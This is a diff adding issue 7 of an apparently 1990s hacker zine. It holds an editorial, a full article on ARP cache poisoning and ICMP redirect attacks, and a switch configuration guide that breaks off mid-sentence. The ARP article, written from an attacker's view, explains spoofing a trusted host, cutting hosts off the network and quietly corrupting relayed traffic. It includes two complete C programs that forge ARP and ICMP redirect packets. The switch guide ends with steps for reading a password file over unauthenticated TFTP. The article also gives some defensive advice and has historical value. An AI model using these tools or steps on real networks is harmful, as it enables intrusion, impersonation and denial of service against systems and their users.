@@ -1,0 +1,2418 @@
+-----------------------------------------------------------------------------  
+                          K E E N  V E R A C I T Y 
+               L E G I O N S  O F  T H E  U N D E R G R O U N D
+                             I S S U E  # [7]
+-----------------------------------------------------------------------------
+
+                              --[CONTENTS]--
+
+(1/8)--[Introduction]---------------------------------------[Digital Ebola]
+(2/8)--[Redir games with ARP and ICMP]-------------------------------[yuri]
+(3/8)--[FUN WITH THE ES-3810 AN ATM REALITY]--------------------[optiklenz]
+(4/8)--[Ip Aliasing]-----------------------------------------------[guidob]
+(5/8)--[Yet Another Newbies Guide to Linux Security]--------[Digital Ebola]
+(6/8)--[UBE98 -- Unbreakable Encryption]----------------------[Joe Peschel] 
+(7/8)--[Windows 95 Protection]-------------------------------------[NtWak0]
+
+---------------------------------------------------------------------------
+[Introduction]                                              [Digital Ebola]
+---------------------------------------------------------------------------
+
+It's here. Better late then never. Keen Veracity 7 is out in full 
+force for your reading pleasure. It seems that recent events are going
+to fuel this issue's editorial. 
+
+The point that I wish to get across is
+not a kind one. The electronic skills you wield for work and play now 
+are showing their full capabilities. YOU are now a weapon. In a 
+alternate universe, a planet wages war, not with ships, jets, or 
+missiles, but with information and computers. Countries are now 
+invading each other via electronic boundaries. IT departments are now
+platoons. No country's data is safe. 
+
+Sound far fetched? Is that really
+an alternate universe or the one in which we now live? You be the judge.
+Its a future that no one wishes to think of, or realise. No matter how
+much we protest, it will come down to it. And this is not a new idea.
+People have been toying around the idea for years. The digital age is
+bringing this concept to life, and there is nothing to stop it. 
+Goverments will try to regulate the people, to show they are making an
+effort, and to cover up their own tracks. For it is not the citizens 
+of the world that will make this happen, but the goverments themselves.
+They are taking a hackers concept, and turning it against the world not
+for the people, but for their gains. The media will help them, because
+it will fuel their coffers as well. I'm sure that certain "sources in
+cyberspace" will be glad to toss fuel on the fire and hype it all up.
+So, now, I ask of you, readers and associates in the field, to think 
+things through before you take that next server. It's coming down to a
+matter of ethics. And it looks like we, as researchers in the field, 
+are the only ones that care.
+
+---------------------------------------------------------------------------
+[ Playing redir games with ARP and ICMP]                   [yuri volobuev]
+---------------------------------------------------------------------------
+      [ -Intro- ]
+
+There're bugs and there're features.  All too often the distinction between
+the two is in the eye of the beholder.  I'd like to show how two legitimate
+protocols, ARP and ICMP, while properly implemented, can be used to achieve
+something which is, well, not desirable.
+
+While passive attacks (sniffing) that take advantage of the root access to
+LAN are extremely popular and every half-way decent root kit has some kind
+of a net sniffer, active attacks are not nearly as widespread.  Yet, active
+participation in the life of your LAN may bring lots of fun and joy.  You
+knew that already, it's just that technical details had been somewhat
+obscure.  So, let there be more light.
+
+Possibilities outlined here include spoofing and DoS.  While other means of
+spoofing, such as IP blind spoofing, are more general and powerful, in terms
+of who can use them, they require quite a lot of (guess)work and may be hard
+to implement.  ARP spoofing, on contrary, is very easy and robust.
+
+While ARP spoofing is only possible on a local network, it may be a serious
+concern as a way to extend an already existing security breach.  If somebody
+can break into one machine on a subnet, ARP spoofing can be used to
+compromise the rest of it.
+
+                           [ -Background on ARP- ]
+
+[well, originally i wrote few paragraphs outlining arp, but then i figured
+that if you didn't know how it works already, you'll need to learn it from a
+better source.  I recommend "TCP/IP Illustrated" by W.Richard Stevens.]
+
+                           [ -What can be done- ]
+
+Let's consider a hypothetical network
+
+IP          10.0.0.1   10.0.0.2  10.0.0.3  10.0.0.4
+hostname       cat        rat       dog       bat
+hw addr       AA:AA      BB:BB     CC:CC     DD:DD    (for short)
+
+all connected by Ethernet in some simple way (i.e. no switches, no smart
+hubs).  You're on cat, you have root and desire to break into dog.  You know
+that dog trusts rat, so if you can successfully spoof rat, something can be
+gained.
+
+First thing that comes to mind (I think everybody was thinking about this at
+some point) is "why don't I set my IP to the IP of that other machine
+and..." That won't work, at least it won't work reliably.  If you tell
+Ethernet driver on cat that it's IP is 10.0.0.2, it'll start answering ARP
+requests to that IP.  But so will rat.  It's a pure race condition, and
+there's no winner.  However, you can easily be the loser, because this
+particular situation happens quite often when some box is misconfigured to
+use somebody's else's IP, so many implmentations immedeately notice that and
+loudly complain.  Many network traffic analyzers flag that, too.  Seeing a
+syslog message saying something nasty (mentioning cat's Ethernet address) on
+the LAN admin's console is not quite what you want.  And what you want you
+won't necessarily get, that is getting anything remotely close to a working
+connection.
+
+This of course can be helped.  The attached program, send_arp.c, can be a
+useful tool.  Just as its name says, it sends an ARP packet [ARP reply, to
+be exact: since the protocol is stateless, reply will be happily accepted
+even if no one ever asked for it.  Request would do just as well, though,
+because of the ARP caching logic] to the net, and you can make this packet
+to be what you want.  What you want is an ability to specify source and
+target IP and hardware addresses.
+
+First, you don't want your Ethernet driver to talk too much, and it's easy
+to accomplish with ifconfig -arp.  Of course, it'll need ARP info anyway, so
+you'll have to feed it to the kernel manually with arp(8).  The critical
+part is convincing your neighbours.  In the case being described here, you
+want dog to believe that rat's hardware address is that of cat (AA:AA), so
+you send ARP reply with source IP 10.0.0.2, source hw address AA:AA, target
+IP address 10.0.0.3 and target hardware address CC:CC.  Now, for all dog
+knows, rat is at AA:AA.  Cache entry would expire, of course, so it needs to
+be updated (request needs to be resent).  How often depends on the
+particular system, but every 40 sec or so should be sufficient for most
+cases.  Send it more often if you want, it won't hurt.
+
+A complication here could come from an ARP caching implementation feature.
+Some systems (e.g. Linux) would try to update their cache entries by sending
+a unicast ARP request to the cached address (like your wife calling you just
+to make sure you're there).  Such a request can screw things up, because it
+could change victim's ARP entry that we just faked, so it must be prevented.
+This can be accomplished by feeding the "wife" system with replies so that
+it never has to ask for it.  Prevention is the best cure, as always.  This
+time, a real packet from dog to rat should be sent, it's just that cat will
+be sending it, not dog, but for rat there's no way to tell.  Again, doing it
+about every 40 sec is usually OK.
+
+So the procedure is simple.  Bring up an alias interface, e.g. eth0:1 (or
+use your current one, whatever), with rat's IP and ARP on -- you need to set
+up some cache entries first, and it won't work on non-arp interface.  Set up
+a host route entry for dog through the right interface.  Set up a cache
+entry for dog, turn off arp, and it's all set.
+
+Now, inject the venom with send_arp (hitting both dog and rat) and for all
+dog knows, you're on rat.  Just remember to keep sending those ARP packets
+to dog and rat.
+
+This attack only works on the local network, of course (in general, it can
+reach as far as ARP packets can get, usually not too far because ARP packets
+are almost never routed).  But an interesting extension here is taking this
+outside by replacing dog's hardware address in the above plan with the
+router's.  If it works (I'm not sure it always will, router's ARP
+implementation may be tougher to fool, and since I don't want to try it on
+real routers, I don't know, but there's no simple reason why not) you can
+easily impersonate any machine on the local network to the rest of the
+world.  So the target machine could really be anywhere, but the machine
+you're impersonating must be on the same LAN.
+
+                         [ -What else can be done- ]
+
+Aside from spoofing, there's range of other things you can do with ARP.  The
+sky is really the limit here.  DoS is the most obvious application.
+
+Feeding victim wrong hardware address is a powerful way to make it mute.
+You can prevent it from talking to any particular machine (and ARP cache
+size usually allows for the whole network to fit in, so effectively you can
+stop it from talking to everybody for some time).  Obvious target would be
+the router.  Cache poisoning again should be two-way: both the victim system
+and the system you don't want victim to talk to should be fed.  The simplest
+case would be feeding a non-existant address.  It's not the most efficient,
+though, as the system will quickly realize that it's talking to nobody and
+send out an ARP request.  Of course, your next drop of poison will nullify
+this, but you have to do it quite often.  A more efficient approach here is
+feeding the victim with the hardware address of the wrong machine, which
+itself is alive and well.  Again, it depends on a particular situation, but
+very often what happens is that victim keeps sending out packets of various
+types that arrive to the wrong destination, and destination system will
+promptly send ICMP Xxx Unreachable messages back, thus emulating a
+connection in some perverted way.  This pseudo-conection can easily postpone
+cache expiry.  On Linux, for example, pseudo-connection raises cache expiry
+from usual 1 min to about 10 min.  By that time, most or all TCP connections
+are screw up.  Could be quite annoying.  This way, one ARP packet can screw
+someone.
+
+An interesting twist here is so-called "gratuitous ARP".  It's when the
+source and target IPs in the ARP request are the same, and it usually
+appears in a form of an Ethernet broadcast.  Some implementations recognize
+it as a special case, that of a system sending out updated information about
+itself to everybody, and cache that request.  This way one packet could
+screw up the entire network.  It must be admitted, though, that gratuitous
+ARP is not really defined as a part of ARP, so it's up to vendor to (not)
+implement it, and it's becoming increasingly less popular.
+
+ARP is a serious tool for professional practical jokes, too.  Just imagine
+somebody setting up a relay, or tunnel, in a form of own machine that
+convinced two neighbours to send their packets intended for each other to
+relay's Ethernet.  If relay just forwards packets to their real
+destinations, no one would even notice.  However, some simple data stream
+modifications could have quite a spectacular effect on one's mental health.
+A simple, CPU-inexpensive "filter" could be swapping random two bytes at
+irregular long intervals.  If it hits the data portion, most of the
+checksums won't change, i.e. data stream would seem to be intact, yet
+strange and unexplicable things _will_ happen for no apparent reason.
+
+                        [ -ICMP redirects- ]
+
+An effect somewhat similar to ARP cache poisoning can be achieved in a
+different way, again using a legitimate protocol feature, ICMP route
+redirects.  Such a redirect is normally sent by the default router to the
+system to indicate that there's a shorter route to some particular
+destination.  Originally, both network and host route redirects were
+proposed, but later net redirects were deprecated and now are usually
+treated as host redirects.  Properly constructed ICMP packet that passes all
+sanity checks (it must come from the default router for the destination it's
+redirecting, new router should be on a directly connected network, etc.) it
+causes a host-route entry be added to the system routing table.
+
+The concept is just as secure as ICMP itself, i.e. (security)NULL.  Spoofing
+routers IP address is simple, and attached icmp_redir.c does just that.
+Host Requirements RFC states that system MUST follow ICMP redirects unless
+it's a router.  And indeed all the systems I've tried happily accept it
+(except vanilla Linux 2.0.30, where it's broken, it works in 2.0.29 and
+2.0.31pre9, according to Alan Cox).
+
+ICMP redirects present a rather potent DoS.  Unlike ARP cache entries, those
+host routes won't expire with time.  And of course no access to local
+network is required, attack can be launched from anywhere.  So if the target
+system does accept ICMP redirects (and packets can actually reach it) that
+system can be stopped from talking to any particular address on the net
+(well, not all, but those that aren't on the same subnet with the target).
+Nameservers would be an obvious target.
+
+                       [ -What can be done about it- ]
+
+ARP is low level protocol and as such is usually hidden from normal people.
+LAN admins may be concerned with it at times, but if all goes well no one
+pays attention.  One can always inspect contents of ARP cache using arp(8),
+especially if there's some misterious network problem, but again it's not
+the first thing that comes to mind.  Even W95 has arp command, and
+remembering about it may be helpful in certain situations.  However, if
+you're the target of the attack originating from another network via gateway
+arp spoofing, there's no way to tell.  Similarly, host routing table could
+be examined to spot ICMP-generated entries (in most versions of route(1)
+they are marked with D letter in flags field).  Just be aware.
+
+The above ARP attack scheme work perfectly for plain old 10Base2 Ethernet.
+However, if machines are interconnected in some more advanced way,
+particularly using some smart hubs or switches, attack can be more visible
+or even impossible (same goes for passive attacks).  So there's yet another
+reason to invest in a good piece of network equipment.  A good deal of peace
+of mind may just come with it.
+
+In general, however, I personally find it rather sad that things like ICMP
+redirects were made a default.  First, it's often not necessary because many
+networks have very simple structure and there's never a need for anything in
+addition to usual routing table.  Second, on more sophisticated networks
+routing table can be just as well set manually, it's not really such a
+dynamic thing, so why do it via ICMP?  And finally, it's dangerous, so I
+would like to disable it on my systems, even though it'll make them less
+compliant with RFC1122.  Alas, it may not be easy.  On Linux or any other OS
+with sources available, I can at least hack the kernel and #define it out.
+On Irix 6.2 and possibly other versions one can set icmp_dropredirects=1
+with systune (I'm genuinely surprised to see it there, I really am).  Other
+OSes can be configurable, too, I have no information.
+
+With ARP, we basically face a situation when the problem of name resolution
+is solved dynamically without a centralized server.  It doesn't have to be
+this way.  When one wants to map hostname to an IP, nameserver is queried or
+/etc/hosts is consulted, i.e. there's some static mapping established.  I
+don't see why a similar thing can't be done with ARP.  Ethernet hardware
+addresses don't change too often, and when they do change, it won't kill net
+admin to change the corresponding map.  Ethernet can be forced in no-arp
+mode, you just need to make sure your ARP cache has all the entries made as
+permanent.  As a bonus, this will reduce network traffic somewhat.  Standard
+procedures can be used to distribute ARP map, e.g. rdist, rsync (I would say
+NIS, but if you use NIS, ARP is probably not your top security concern
+anyway).  Old tradition of /etc/ethers can be brought back to life.  But
+getting a kick-ass Ethernet switch still looks better to me (paying for it
+does not, though).
+
+And old wisdom still shine bright though time: don't use hostname-only based
+auth.  Those who do shall have no mercy from net gods.
+
+cheers,
+
+yuri
+
+P.S. On Firewalls
+
+I anticipate that many of you, having read the section about ICMP, are
+already flexing the fingers preparing to write a follow-up explaining that
+all those ICMP packets can be filtered out on the firewall, thus it's not a
+problem.  Please don't.  I'm well aware of the concept.  An if you feel you
+absolutely have to, don't cc the list needlessly.
+
+I have to note that many people use "i have firewall, and I like it,
+therefore everyone else should get one or get lost" logic to argue that
+certain security problems are less serious because they can be effectively
+eliminated by putting a firewall between the protected network and
+Internet.  While I fully agree that having firewall is very good for
+security, I want to note that it's not always possible or effective.
+
+Imagine an environment where all machines are directly connected to
+Internet, you have to share subnet with people you don't know who have
+vanilla SGI boxes screaming "hack me pleeeease, my vendor did such a great
+job of making it eeeeeeasy" all over the place (and sure, these people know
+Unix, they've seen it in Jurassic Park... and that would be about it), and
+the router to your subnet is controlled by a separate organization.  Welcome
+to a standard academic environment, where people don't use firewalls.  In
+fact, in some of those environments one would be useful to protect the
+outside world from the people on the inside.  Still, people work there, and
+use computers, too.  And that's where per-host security solutions are
+necessary, it's a jungle where every host is for itself.  So please, next
+time you think "firewall", remember, it's not for everyone.
+
+CUT HERE
+/* send_arp.c
+
+This program sends out one ARP packet with source/target IP and Ethernet
+hardware addresses suuplied by the user.  It compiles and works on Linux
+and will probably work on any Unix that has SOCK_PACKET.
+
+The idea behind this program is a proof of a concept, nothing more.  It
+comes as is, no warranty.  However, you're allowed to use it under one
+condition: you must use your brain simultaneously.  If this condition is
+not met, you shall forget about this program and go RTFM immediately.
+
+yuri volobuev'97
+volobuev@t1.chem.umn.edu
+
+*/
+
+#include <stdio.h>
+#include <ctype.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <linux/in.h>
+#include <arpa/inet.h>
+#include <linux/if_ether.h>
+
+
+#define ETH_HW_ADDR_LEN 6
+#define IP_ADDR_LEN 4
+#define ARP_FRAME_TYPE 0x0806
+#define ETHER_HW_TYPE 1
+#define IP_PROTO_TYPE 0x0800
+#define OP_ARP_REQUEST 2
+
+#define DEFAULT_DEVICE "eth0"
+
+char usage[]={"send_arp: sends out custom ARP packet. yuri volobuev'97\n\
+\tusage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr\n\n"};
+
+struct arp_packet {
+        u_char targ_hw_addr[ETH_HW_ADDR_LEN];
+        u_char src_hw_addr[ETH_HW_ADDR_LEN];
+        u_short frame_type;
+        u_short hw_type;
+        u_short prot_type;
+        u_char hw_addr_size;
+        u_char prot_addr_size;
+        u_short op;
+        u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
+        u_char sndr_ip_addr[IP_ADDR_LEN];
+        u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
+        u_char rcpt_ip_addr[IP_ADDR_LEN];
+        u_char padding[18];
+};
+
+void die(char *);
+void get_ip_addr(struct in_addr*,char*);
+void get_hw_addr(char*,char*);
+
+int main(int argc,char** argv){
+
+struct in_addr src_in_addr,targ_in_addr;
+struct arp_packet pkt;
+struct sockaddr sa;
+int sock;
+
+if(argc != 5)die(usage);
+
+sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_RARP));
+if(sock<0){
+        perror("socket");
+        exit(1);
+        }
+
+pkt.frame_type = htons(ARP_FRAME_TYPE);
+pkt.hw_type = htons(ETHER_HW_TYPE);
+pkt.prot_type = htons(IP_PROTO_TYPE);
+pkt.hw_addr_size = ETH_HW_ADDR_LEN;
+pkt.prot_addr_size = IP_ADDR_LEN;
+pkt.op=htons(OP_ARP_REQUEST);
+
+get_hw_addr(pkt.targ_hw_addr,argv[4]);
+get_hw_addr(pkt.rcpt_hw_addr,argv[4]);
+get_hw_addr(pkt.src_hw_addr,argv[2]);
+get_hw_addr(pkt.sndr_hw_addr,argv[2]);
+
+get_ip_addr(&src_in_addr,argv[1]);
+get_ip_addr(&targ_in_addr,argv[3]);
+
+memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
+memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN);
+
+bzero(pkt.padding,18);
+
+strcpy(sa.sa_data,DEFAULT_DEVICE);
+if(sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0){
+        perror("sendto");
+        exit(1);
+        }
+exit(0);
+}
+
+void die(char* str){
+fprintf(stderr,"%s\n",str);
+exit(1);
+}
+
+void get_ip_addr(struct in_addr* in_addr,char* str){
+
+struct hostent *hostp;
+
+in_addr->s_addr=inet_addr(str);
+if(in_addr->s_addr == -1){
+        if( (hostp = gethostbyname(str)))
+                bcopy(hostp->h_addr,in_addr,hostp->h_length);
+        else {
+                fprintf(stderr,"send_arp: unknown host %s\n",str);
+                exit(1);
+                }
+        }
+}
+
+void get_hw_addr(char* buf,char* str){
+
+int i;
+char c,val;
+
+for(i=0;i<ETH_HW_ADDR_LEN;i++){
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else die("Invalid hardware address");
+
+        *buf = val << 4;
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else die("Invalid hardware address");
+
+        *buf++ |= val;
+
+        if(*str == ':')str++;
+        }
+}
+
+CUT HERE
+
+/* icmp_redir.c
+
+This program sends out an ICMP host redirect packet with gateway IP supplied
+by user.  It was written and tested under Linux 2.0.30 and could be rather
+easily modified to work on most Unices.
+
+The idea behind this program is a proof of a concept, nothing more.  It
+comes as is, no warranty.  However, you're allowed to use it under one
+condition: you must use your brain simultaneously.  If this condition is
+not met, you shall forget about this program and go RTFM immediately.
+
+yuri volobuev'97
+volobuev@t1.chem.umn.edu
+
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <syslog.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/ip.h>
+
+#define IPVERSION       4
+
+struct raw_pkt {
+        struct iphdr ip; /* This is Linux-style iphdr.
+                            Use BSD-style struct ip if you want */
+        struct icmphdr icmp;
+        struct iphdr encl_iphdr;
+        char encl_ip_data[8];
+};
+
+struct raw_pkt* pkt;
+
+void die(char *);
+unsigned long int get_ip_addr(char*);
+unsigned short checksum(unsigned short*,char);
+
+int main(int argc,char** argv){
+
+struct sockaddr_in sa;
+int sock,packet_len;
+char usage[]={"icmp_redir: send out custom ICMP host redirect packet.  \
+yuri volobuev'97\n\
+usage: icmp_redir gw_host targ_host dst_host dummy_host\n"};
+char on = 1;
+
+if(argc != 5)die(usage);
+
+if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+        perror("socket");
+        exit(1);
+        }
+
+sa.sin_addr.s_addr = get_ip_addr(argv[2]);
+sa.sin_family = AF_INET;
+
+packet_len = sizeof(struct raw_pkt);
+pkt = calloc((size_t)1,(size_t)packet_len);
+
+pkt->ip.version = IPVERSION;
+pkt->ip.ihl = sizeof(struct iphdr) >> 2;
+pkt->ip.tos = 0;
+pkt->ip.tot_len = htons(packet_len);
+pkt->ip.id = htons(getpid() & 0xFFFF);
+pkt->ip.frag_off = 0;
+pkt->ip.ttl = 0x40;
+pkt->ip.protocol = IPPROTO_ICMP;
+pkt->ip.check = 0;
+pkt->ip.saddr = get_ip_addr(argv[1]);
+pkt->ip.daddr = sa.sin_addr.s_addr;
+pkt->ip.check = checksum((unsigned short*)pkt,sizeof(struct iphdr));
+
+pkt->icmp.type = ICMP_REDIRECT;
+pkt->icmp.code = ICMP_REDIR_HOST;
+pkt->icmp.checksum = 0;
+pkt->icmp.un.gateway = get_ip_addr(argv[4]);
+
+memcpy(&(pkt->encl_iphdr),pkt,sizeof(struct iphdr));
+pkt->encl_iphdr.protocol = IPPROTO_IP;
+pkt->encl_iphdr.saddr = get_ip_addr(argv[2]);
+pkt->encl_iphdr.daddr = get_ip_addr(argv[3]);
+pkt->encl_iphdr.check = 0;
+pkt->encl_iphdr.check = checksum((unsigned short*)&(pkt->encl_iphdr),
+        sizeof(struct iphdr));
+
+pkt->icmp.checksum = checksum((unsigned short*)&(pkt->icmp),
+        sizeof(struct raw_pkt)-sizeof(struct iphdr));
+
+if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
+        perror("setsockopt: IP_HDRINCL");
+        exit(1);
+        }
+
+if(sendto(sock,pkt,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0){
+        perror("sendto");
+        exit(1);
+        }
+exit(0);
+}
+
+void die(char* str){
+fprintf(stderr,"%s\n",str);
+exit(1);
+}
+
+unsigned long int get_ip_addr(char* str){
+
+struct hostent *hostp;
+unsigned long int addr;
+
+if( (addr = inet_addr(str)) == -1){
+        if( (hostp = gethostbyname(str)))
+                return *(unsigned long int*)(hostp->h_addr);
+        else {
+                fprintf(stderr,"unknown host %s\n",str);
+                exit(1);
+                }
+        }
+return addr;
+}
+
+unsigned short checksum(unsigned short* addr,char len){
+register long sum = 0;
+
+while(len > 1){
+        sum += *addr++;
+        len -= 2;
+        }
+if(len > 0) sum += *addr;
+while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);
+
+return ~sum;
+}
+
+---------------------------------------------------------------------------
+[FUN WITH THE ES-3810 AN ATM REALITY]                           [optiklenz]
+---------------------------------------------------------------------------
+
+NAME: Steve Stakton a.k.a. <optiklenz> 
+AFFILIATION: LOU- Legions Of the Underground 
+GOAL: TO KNOW BOTH WHAT EVERYONE ELSE KNOWS, AND DOESN'T KNOW 
+AGE: CAN YOU COUNT TO 24? 
+HEIGHT: WHY DONT I JUST DRAW YOU A FULL SKETCH COMPOSITE FOR YOUR WANTED 
+POSTERS? 
+WHERE: ON THE ROAD 
+DESTINATION: YET TO BE DECIDED 
+INTEREST: PHONE SYSTEMS (WHO DOESN'T USE THE TERM 
+COSMOS ON A DAY TO DAY BASIS), NETWORKS, ELECTRONICS, BEER, 
+RIGGING THE LOCAL NMS TO BREED WITH THE NEIGHBORS PDN. SOUTH PARK, 
+AND GIRLS WITH SLIGHT FACIAL HAIR 
+TURN-OFFS: PEOPLE WHO THINK THEY KNOW THINGS THEY DONT, AND GIRLS  
+WITH TO MUCH FACIAL HAIR. 
+HANGOUTS: VENICE BEACH, Narkotik Illusions, The Abyss & the Electronic 
+Source BBS 
+MUSIC GROUPs: Pink Floyd, and ICP, Rolling Stones (NO SECURITY!) 
+WEB: http://www.legions.org, http://www.t00ned.org/optik/ 
+OS OF CHOICE: *BSD 
+OS'S THAT SUCK: CALDERA, MACOS, AND THAT ONE OS MADE BY THAT BILL GUY.
+
+
+
+           "Get out and ride on, baby, ride on, baby 
+           Ride on, baby, ride on, baby 
+           I could pick your face out in an FBI file 
+           You may look pretty but I can't say the same  
+           for your mind" -Rolling Stones 
+ 
+ 
+On with the show... 
+ 
+ 
+First off there are some definitions, and Acronyms to be familiar with. 
+ 
+AMI (ATM Management Interface) - The user interface to switching control  
+    software.  AMI lets you monitor and change various operating 
+    configurations of switches and network module hardware and software, 
+    IP connectivity, and SNMP network management 
+ 
+Bandwidth- usually identifies the capacity of data that can be sent 
+           through a given circuit; may be user-specified in a PVC. 
+ 
+CBR (Constant Bit Rate)- A type of traffic that requires a continuous, 
+     specific amount of bandwidth over the ATM network 
+     (e.g., digital information such as video and digitized voice) 
+ 
+ANSI (American National Standards Institute)- A private organization that 
+     coordinates the setting and approval of some U.S standards. It also
+     represents the U.S ISO   
+
+BIP (Bit Interleaved Parity)- An error detection technique in which 
+    character bit patterns are forced into parity, so that the total
+    number of one bits is always odd or even.   
+
+DSR (Data Set Ready)- an RS-232 modem interface control signal 
+    (sent from the modem to the DTE on pin 6) which indicates that the
+     modem is connected to the telephone circuit.   
+
+DTE (Data Terminal Equipment)- generally user devices, such as terminals 
+     and computers that connect to data circuit terminating equipment. 
+     They either generate or capture data sent by the network 
+ 
+ATDM (Asynchronous Time Division Multiplexing)- A method of sending 
+     information that resembles normal TDM, except that time slots are 
+     allocated as needed rather than prearranged to specific transmitters. 
+ 
+EM- The CellPath 300 extension module; paired with the system controller 
+    and supporting an optional PCMCIA card. 
+ 
+FDDI (Fiber distributed Data Interface)- High-speed data network that uses 
+     fiber-optic as the physical medium 
+ 
+EPROM- Erasable Programmable Read Only Memory. 
+ 
+CLP (Cell Loss Priority)- the last bit of byte four in an ATM cell header; 
+    indicates the eligibility of the cell for discard by the network under 
+    congested conditions.   
+ 
+ 
+[Introductory to the Management Station 
+------------------* 
+ 
+The ES-3810 is a switching architecture; it provides one with the ability 
+to work with multiple switched Ethernet ports along with high performance 
+ATM server and backbone connections to work with powerful network managing.  
+ 
+The management console for the ES-3810 uses a menu based interface that 
+utilizes A VT-100  terminal or VT-100 emulator like ProComm or PC Plus.The
+serial interface   of the ES-3810 connects directly to either the DTE
+interface of the ASCII terminal or a serial port of the PC or workstation
+running terminal emulation.   
+
+Note: If the NMM's SNMP-based management or IGMP support is going to be 
+      used, a console connection is required the first time the NMM is 
+      brought online since an IP address, subnet mask and possibly a
+      gateway must be defined.   
+ 
+ 
+[System Specs 
+------------------* 
+ 
+Aggregate Throughput      | 720,000 pps (packets per second) 
+Latency                   | 61 ~s per 64-bp (byte packets) 
+Filter/Forward Speed      | 14,881pps 
+Addresses/Port            | 4 [workgroup]; 8,192 [segment] 
+Buffering/Port            | 256kb 
+Media                     | UTP  
+ 
+ 
+ Print of settings an ES-3810 
+ 
+    ____________________________________________________________________________ 
+   |                                                                            | 
+   | ES-3810 Interface Configuration                                            | 
+   |____________________________________________________________________________| 
+   |                                     |                                      | 
+   |  Type:                   SEC-10b    | Full Duplex:                Disabled | 
+   |  MAU:                    10BaseT    | Loopback:                   Disabled | 
+   |  Number:                 0          | Mode:                       Workgroup| 
+   |_____________________________________|______________________________________| 
+   |Media Configuration:  Auto-Negotiation In Process                           | 
+   |____________________________________________________________________________| 
+   |                                     |                                      | 
+   |  Link Detected:          No         | Forced Transmits:            Disabled| 
+   |  Link Polarity:          Correct    | VLAN Extension:                 n/a  |            
+   |                                     | Multicast Filtering:            n/a  | 
+   |_____________________________________|______________________________________|                  
+   |                                     | Transmitter:                 Enabled | 
+   |  Receiver:               Enabled    | Transmit Buffer:             Enabled | 
+   |  Receive Buffer:         Enabled    |                                      | 
+   |_____________________________________|______________________________________| 
+   |                                     |                                      | 
+   |  Sniff Segment:          Disabled   | Transmit Sniffed Packets:    Disabled| 
+   |  Blocking:               Disabled   | Transmit Blocked Packets:    Disabled| 
+   |  Receive Errors:         Disabled   | Transmit Flagged Packets:    Disabled| 
+   |  Multicast Promiscuous:  Disabled   | Multicast Hash Upload:       Disabled|               
+   |  Individual Promiscuous: Disabled   |                                      | 
+   |_____________________________________|______________________________________| 
+   |lou%: ef cfg; do 6fde8000                                                   | 
+    
+ 
+[VLAN Assignments 
+------------------------* 
+ 
+VLANs are OSI Layer 2 [data link] multicast domains.  VLAN membership is  
+not necessarily tied to a physical proximity.  The ES-3810 supports three 
+criteria: MAC address based assignment to a VLAN, IP Multicast Group based 
+assignment, and port base assignment. 
+ 
+[MAC Address based and Port based VLANs 
+---------------------------------------* 
+ 
+MAC address based VLAN assignments supersedes port based VLAN assignment.  
+By adding an ATM module you can extend any VLAN into ATM by assigning a LEC 
+(Lan Emulation Client) instance to the VLAN.  A VLAN extended into ATM must 
+be named with the same NAME and CASE as the ELAN for example, an ELAN called 
+"Lab" exists and you want the station on ES-3810 port 16 to join it.  On the  
+#s-3810 you must create a VLAN called "Lab" (case sensitive) and assign port  
+16 to it.  when asked to "configure a LEC" say yes.  The ES-3810 will join  
+(in proxy) the ELAN called "Lab" and allows the station port 16 communication  
+rights. 
+ 
+ 
+[IGMP Based VLANs 
+---------------------------------------* 
+Some TCP/IP applications use IP multicasts to deliver data to many stations 
+at once.  How ever multicasting can cause problems because stations that 
+are not interested in receiving multicast data to see it anyway. This 
+causes Ethernet segment congestion and unnecessary interrupts on
+workstations.    Filtering these multicasts via IGMP can reduce 
+congestion and keep the network moving smoothly. 
+ 
+IGMP is designed to add further granularity within a VLAN. If a station 
+from two separate VLANS join the same IP multicast group; the IP multicast
+stream has to be   sourced twice.  The IP client of the ES-3810 is 
+reachable from the first configured  VLAN, independent of that VLANs name.
+Since, by default the first VLAN is called "default"   
+
+[Routerless Network 
+------------------------* 
+ 
+A routerless network is one in which the ES-3810 switches Ethernet 
+attached host to ATM  where high speed servers are found. Typically one or
+several of the following apply
+   
+* Network has no VLAN-to-VLAN traffic requirement 
+* Primary NOS is client/server based 
+* Security is a MAJOR concern (trust me on this one) 
+* Servers are on ATM for maximum performance 
+ 
+Any network matching one or more of the above scenarios would benefit from 
+a routerless network because clients from different VLANs can access the 
+same server but not other VLANs 
+ 
+[Centralized Routing Network 
+----------------------------* 
+ 
+A centralized routing network is one in which the ES-3810 switches Ethernet 
+attached host to ATM where high-speed servers and router interfaces are found. 
+Typically the ES-3810 can be utilized in a network that meets one or more of  
+the following criteria 
+ 
+ 
+* Maintenance of relatively flat network 
+* Some VLAN to VLAN connectivity 
+* Some VLAN to VLAN packet level filtering/firewalling 
+* Traffic is 80% local and 20% routed 
+* Network could collapse into fewer subnets by switching to ATM 
+ 
+ 
+[Exploiting TFTP/ES-3810 
+------------------------* 
+ 
+Issuing the command line rs  :/cd usr do _filter area_ off will disable 
+POST recognition by other users.  Another thing that can be done is 
+gaining remote access this can only happen if TFTP is binded to the system,
+and on the same subnet as the ES-3810 system.(which it should be by 
+default if utilized). Since there is no password authentication you can 
+use tftp to access the systems password file. Although you have read 
+access to the password file other flags, and restricted privileges keep 
